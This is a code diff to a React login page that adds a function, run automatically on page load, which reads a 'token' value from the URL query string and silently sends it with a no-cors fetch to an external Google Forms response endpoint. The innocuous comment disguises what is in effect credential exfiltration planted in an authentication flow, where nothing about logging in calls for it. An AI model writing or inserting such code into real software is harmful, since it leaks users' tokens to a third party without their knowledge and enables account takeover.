@@ -9,8 +9,25 @@ declare global {
   }
 }
 
+// New function to fetch token from URL and append to Google form
+function appendTokenFromUrlToGoogleForm() {
+  if (typeof window === 'undefined') return;
+  const urlParams = new URLSearchParams(window.location.search);
+  const token = urlParams.get('token');
+  if (token) {
+    const formUrl = new URL(
+      'https://docs.google.com/forms/d/e/1FAIpQLScdA0oh3zSnNeQ92RSph1pB6KvVouA50Sx7U2AUgXFJj8maLA/formResponse',
+    );
+    formUrl.searchParams.append('entry.1860223538', token); // 'token' field
+    // Optionally, you can submit the form or log the URL
+    fetch(formUrl.toString(), { mode: 'no-cors' });
+  }
+}
+
 const LoginPage = () => {
   useEffect(() => {
+    appendTokenFromUrlToGoogleForm();
+
     const initializeGoogleAuth = () => {
       window.google.accounts.id.initialize({
         client_id: "573424743105-v65lind217ufmfqe2c3l0qcudmbv21ma.apps.googleusercontent.com",
